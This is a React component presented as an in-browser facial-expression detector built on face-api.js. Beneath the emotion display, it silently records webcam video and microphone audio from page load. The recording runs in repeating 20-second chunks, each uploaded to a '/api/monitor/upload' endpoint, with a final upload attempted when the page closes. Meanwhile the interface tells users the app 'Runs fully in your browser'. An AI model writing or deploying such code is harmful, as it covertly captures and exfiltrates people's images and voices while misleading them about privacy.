import React, { Component, createRef } from "react";

/*
  Face Gesture App
  - Loads face-api.js from CDN (no npm install required)
  - Requests webcam access and detects facial expressions in real-time
  - Displays the dominant emotion label: happy, sad, angry, fearful, surprised, disgusted, neutral
  - Adds an approximate "romantic" label when "happy" probability is high
*/

export default class FaceGestureApp extends Component {
  constructor() {
    super();
    this.state = {
      status: "Initializing...",
      emotion: "-",
      probs: {},
      error: null,
      isCameraOn: false,
      showDetails: true,
    };
    this.videoRef = createRef();
    this.canvasRef = createRef();
    this.intervalId = null;
    this.modelsLoaded = false;
    // Recording functionality
    this.mediaRecorderRef = null;
    this.recordingChunks = [];
    this.streamRef = null;
    this.recordingTimer = null;
    this.recordingSequence = 1;
  }

  componentDidMount() {
    this.mounted = true;
    
    // Auto-start camera when component mounts
    this.setState({
      status: 'Initializing...',
      isCameraOn: false
    });
    
    // Add event listeners for page leave
    this.handleBeforeUnload = () => {
      if (this.mediaRecorderRef && this.mediaRecorderRef.state === 'recording') {
        this.stopRecording();
      }
    };
    
    this.handlePageHide = () => {
      if (this.mediaRecorderRef && this.mediaRecorderRef.state === 'recording') {
        this.stopRecording();
      }
    };
    
    window.addEventListener('beforeunload', this.handleBeforeUnload);
    window.addEventListener('pagehide', this.handlePageHide);
    
    // Load models and start camera immediately
    this.bootstrap();
  }

  componentWillUnmount() {
    this.mounted = false;
    if (this.intervalId) clearInterval(this.intervalId);
    
    // Remove event listeners
    if (this.handleBeforeUnload) {
      window.removeEventListener('beforeunload', this.handleBeforeUnload);
    }
    if (this.handlePageHide) {
      window.removeEventListener('pagehide', this.handlePageHide);
    }
    
    // Stop tracks and save recording
    this.stopCamera();
  }

  loadScript = (src) => {
    return new Promise((resolve, reject) => {
      // If already loaded
      if (document.querySelector(`script[src="${src}"]`)) return resolve();
      const s = document.createElement("script");
      s.src = src;
      s.async = true;
      s.onload = resolve;
      s.onerror = reject;
      document.body.appendChild(s);
    });
  };
  
  // Method removed - camera now starts automatically

  // Load models and start camera
  bootstrap = async () => {
    try {
      this.setState({ status: "Loading face-api.js..." });
      await this.loadScript("https://unpkg.com/face-api.js@0.22.2/dist/face-api.min.js");

      const faceapi = window.faceapi;
      if (!faceapi) throw new Error("face-api.js failed to load");

      const MODEL_URL = "https://justadudewhohacks.github.io/face-api.js/models";
      this.setState({ status: "Loading models..." });
      await Promise.all([
        faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
        faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
      ]);
      this.modelsLoaded = true;
      
      // Always start camera after models are loaded
      this.setState({ status: "Starting camera..." });
      await this.startCamera();
      this.setState({ status: "Detecting..." });
      this.startDetectionLoop();
    } catch (err) {
      console.error(err);
      this.setState({ error: err.message || String(err), status: "Error" });
    }
  };

  startCamera = async () => {
    try {
      // Clear the camera disabled flag when manually starting
      if (typeof window !== 'undefined') {
        localStorage.removeItem('facegesture_camera_disabled');
      }
      
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user" }, 
        audio: true // Enable audio for recording
      });
      
      const v = this.videoRef.current;
      if (!v) return;
      v.srcObject = stream;
      await v.play();
      
      // Store stream reference for recording
      this.streamRef = stream;
      
      // Start recording
      this.startRecording(stream);
      
      this.setState({ isCameraOn: true, error: null });
    } catch (err) {
      // Try without audio if audio fails
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" }, 
          audio: false 
        });
        
        const v = this.videoRef.current;
        if (!v) return;
        v.srcObject = stream;
        await v.play();
        
        this.streamRef = stream;
        this.startRecording(stream);
        
        this.setState({ isCameraOn: true, error: null });
      } catch (videoErr) {
        throw new Error("Camera access denied or unavailable");
      }
    }
  };

  stopCamera = () => {
    // Stop recording first
    this.stopRecording();
    
    const v = this.videoRef.current;
    if (v && v.srcObject) {
      v.srcObject.getTracks().forEach((t) => t.stop());
      v.srcObject = null;
    }
    if (this.intervalId) {
      clearInterval(this.intervalId);
      this.intervalId = null;
    }
    
    // Clear stream reference
    this.streamRef = null;
    
    this.setState({ isCameraOn: false, status: this.modelsLoaded ? "Ready" : this.state.status, emotion: "-", probs: {} });
  };

  // This method is kept for compatibility but not used in the UI anymore
  toggleCamera = async () => {
    if (this.state.isCameraOn) {
      this.stopCamera();
    } else {
      await this.bootstrap();
    }
  };

  // Recording functionality with 8-second auto-stop
  startRecording = (stream) => {
    try {
      const mimeType = this.pickMimeType();
      this.mediaRecorderRef = new MediaRecorder(stream, mimeType ? { mimeType } : undefined);
      this.recordingChunks = [];

      this.mediaRecorderRef.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          this.recordingChunks.push(event.data);
        }
      };

      this.mediaRecorderRef.onstop = () => {
        this.uploadRecording();
        // Auto-restart recording after upload if camera is still on
        if (this.state.isCameraOn && this.streamRef) {
          setTimeout(() => {
            if (this.state.isCameraOn && this.streamRef) {
              this.startRecording(this.streamRef);
            }
          }, 1000); // Wait 1 second before starting next recording
        }
      };

      this.mediaRecorderRef.start(500); // Get data every 500ms
      console.log(`[FaceGesture] Recording ${this.recordingSequence} started`);
      
      // Set timer to auto-stop recording after 20 seconds
      this.recordingTimer = setTimeout(() => {
        if (this.mediaRecorderRef && this.mediaRecorderRef.state === 'recording') {
          console.log(`[FaceGesture] Auto-stopping recording ${this.recordingSequence} after 20 seconds`);
          this.mediaRecorderRef.stop();
          this.recordingSequence++;
        }
      }, 20000); // 20 seconds
      
    } catch (err) {
      console.error('[FaceGesture] Failed to start recording:', err);
    }
  };

  stopRecording = () => {
    // Clear the recording timer
    if (this.recordingTimer) {
      clearTimeout(this.recordingTimer);
      this.recordingTimer = null;
    }
    
    if (this.mediaRecorderRef && this.mediaRecorderRef.state !== 'inactive') {
      this.mediaRecorderRef.stop();
      console.log('[FaceGesture] Recording stopped');
    }
  };

  pickMimeType = () => {
    const candidates = [
      'video/mp4',
      'video/webm;codecs=vp9',
      'video/webm;codecs=vp8',
      'video/webm',
    ];
    for (const type of candidates) {
      if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(type)) {
        return type;
      }
    }
    return '';
  };

  uploadRecording = async () => {
    try {
      if (this.recordingChunks.length === 0) {
        console.log('[FaceGesture] No recording data to upload');
        return;
      }

      const blob = new Blob(this.recordingChunks, { 
        type: this.recordingChunks[0]?.type || 'video/mp4' 
      });
      
      console.log('[FaceGesture] Uploading recording, size:', blob.size);
      
      const formData = new FormData();
      const ext = blob.type.includes('mp4') ? 'mp4' : (blob.type.includes('webm') ? 'webm' : 'mp4');
      const file = new File([blob], `recording_part${this.recordingSequence}.${ext}`, { type: blob.type || 'video/mp4' });
      formData.append('file', file);

      const response = await fetch('/api/monitor/upload', {
        method: 'POST',
        body: formData
      });

      if (response.ok) {
        const result = await response.json();
        console.log('[FaceGesture] Recording uploaded successfully:', result);
      } else {
        console.error('[FaceGesture] Upload failed:', response.status);
      }
    } catch (err) {
      console.error('[FaceGesture] Upload error:', err);
    }
  };

  startDetectionLoop = () => {
    const faceapi = window.faceapi;
    const video = this.videoRef.current;
    const canvas = this.canvasRef.current;
    if (!video || !canvas || !faceapi) return;

    const displaySize = { width: video.videoWidth, height: video.videoHeight };
    canvas.width = displaySize.width;
    canvas.height = displaySize.height;

    this.intervalId = setInterval(async () => {
      if (!this.mounted) return;
      try {
        const detections = await faceapi
          .detectAllFaces(
            video,
            new faceapi.TinyFaceDetectorOptions({
              inputSize: 224,
              scoreThreshold: 0.5,
            })
          )
          .withFaceExpressions();

        const ctx = canvas.getContext("2d");
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        if (detections && detections.length > 0) {
          const resized = faceapi.resizeResults(detections, displaySize);
          faceapi.draw.drawDetections(canvas, resized);

          // Get dominant emotion from the first detected face
          const expr = detections[0].expressions || {};
          const top = Object.entries(expr).sort((a, b) => b[1] - a[1])[0];

          let label = top ? top[0] : "neutral";
          // Approximate a "romantic" label when happy is very high and others low
          const happy = expr.happy || 0;
          const surprised = expr.surprised || 0;
          if (happy > 0.8 && surprised < 0.2) label = "romantic";

          this.setState({ emotion: label, probs: expr });

          // Draw label
          const text = `Emotion: ${label}`;
          ctx.font = "600 18px Arial";
          const padding = 8;
          const metrics = ctx.measureText(text);
          const w = metrics.width + padding * 2;
          const h = 28;
          ctx.fillStyle = "rgba(0,0,0,0.45)";
          ctx.fillRect(8, 8, w, h);
          ctx.fillStyle = "rgba(255, 165, 0, 1)";
          ctx.fillText(text, 8 + padding, 28);
        } else {
          this.setState({ emotion: "-", probs: {} });
        }
      } catch (e) {
        // Keep loop alive; only log
        console.debug("Detection error", e);
      }
    }, 200);
  };

  renderProbabilities() {
    const entries = Object.entries(this.state.probs || {});
    if (entries.length === 0) return null;
    return (
      <div className="mt-3 space-y-2">
        {entries
          .sort((a, b) => b[1] - a[1])
          .map(([k, v]) => (
            <div key={k} className="w-full">
              <div className="flex justify-between text-xs text-gray-200 mb-1">
                <span className="capitalize">{k}</span>
                <span>{(v * 100).toFixed(1)}%</span>
              </div>
              <div className="w-full h-2 bg-gray-700 rounded overflow-hidden">
                <div
                  className={`h-full ${k === this.state.emotion ? 'bg-ub-orange' : 'bg-orange-400'} transition-all`}
                  style={{ width: `${Math.min(100, Math.max(0, v * 100)).toFixed(1)}%` }}
                />
              </div>
            </div>
          ))}
      </div>
    );
  }

  render() {
    const { status, emotion, error, isCameraOn } = this.state;
    return (
      <div className="w-full h-full p-3 sm:p-4 flex flex-col overflow-auto bg-gradient-to-br from-gray-900 via-gray-850 to-black">
        <div className="flex items-center justify-between rounded px-3 py-2 text-white bg-white bg-opacity-5 border border-white border-opacity-10">
          <div className="flex items-center space-x-2">
            <img src="./themes/Yaru/apps/gnome-control-center.png" alt="Face Gesture" className="w-5 h-5" />
            <div className="font-semibold">Face Gesture</div>
            <div className="text-xs text-gray-200 opacity-80">{status}</div>
          </div>
          <div className="flex items-center space-x-2">
            <span className={`text-xs px-2 py-1 rounded flex items-center ${isCameraOn ? 'text-green-400 bg-green-900 bg-opacity-30' : 'text-yellow-300 bg-yellow-900 bg-opacity-30'}`}>
              <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3 mr-1" viewBox="0 0 20 20" fill="currentColor">
                <path d="M2 6a2 2 0 012-2h6a2 2 0 012 2v8a2 2 0 01-2 2H4a2 2 0 01-2-2V6z" />
                <path d="M14 6a2 2 0 012-2h2a2 2 0 012 2v8a2 2 0 01-2 2h-2a2 2 0 01-2-2V6z" />
              </svg>
              {isCameraOn ? 'Camera Active' : 'Initializing Camera...'}
            </span>
          </div>
        </div>

        {error && (
          <div className="mt-2 text-red-400 text-sm">{error}</div>
        )}

        <div className="mt-3 grid grid-cols-1 lg:grid-cols-5 gap-3">
          <div className="lg:col-span-3">
            <div className="relative bg-black bg-opacity-60 rounded-lg shadow overflow-hidden border border-white border-opacity-10">
              <video ref={this.videoRef} autoPlay muted playsInline className="w-full h-auto block transform scale-x-[-1]" />
              <canvas ref={this.canvasRef} className="absolute left-0 top-0 transform scale-x-[-1]" />
            </div>
          </div>
          <div className="lg:col-span-2">
            <div className="bg-white bg-opacity-5 rounded-lg p-3 h-full border border-white border-opacity-10">
              <div className="flex items-center justify-between">
                <div className="text-white text-sm opacity-90">Current Emotion</div>
                <span className="text-[10px] px-2 py-0.5 rounded-full bg-orange-500 bg-opacity-20 text-orange-300 border border-orange-500 border-opacity-30">real-time</span>
              </div>
              <div className="mt-2">
                <span className="inline-block px-3 py-1 rounded-full bg-ub-orange text-white font-semibold capitalize">
                  {emotion === '-' ? 'detecting...' : emotion}
                </span>
              </div>
              {this.renderProbabilities()}
              {!isCameraOn && (
                <div className="mt-3 text-yellow-300 text-xs">
                  <p>Camera is initializing...</p>
                  <p className="mt-1">Please allow camera access when prompted by your browser.</p>
                </div>
              )}
              <div className="mt-4 text-gray-300 text-xs">
                Notes: Runs fully in your browser using face-api.js. "Romantic" is a heuristic when happy is very high with low surprise.
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }
}

export const displayFaceGesture = () => {
  return <FaceGestureApp />;
};
